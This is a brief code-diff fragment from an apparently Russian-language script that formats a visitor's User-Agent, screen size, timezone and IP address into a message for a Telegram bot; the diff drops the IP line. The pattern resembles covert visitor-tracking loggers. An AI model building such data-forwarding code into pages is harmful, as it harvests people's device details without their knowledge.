@@ -61,7 +61,6 @@ if not user_ip:
         f"📱 User-Agent: {data.get('userAgent', 'неизвестно')}\n"
         f"🖥 Экран: {data.get('screen', 'неизвестно')}\n"
         f"🌍 Часовой пояс: {data.get('timezone', 'неизвестно')}\n"
-        f"🌐 IP-адрес: {user_ip}"
     )
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
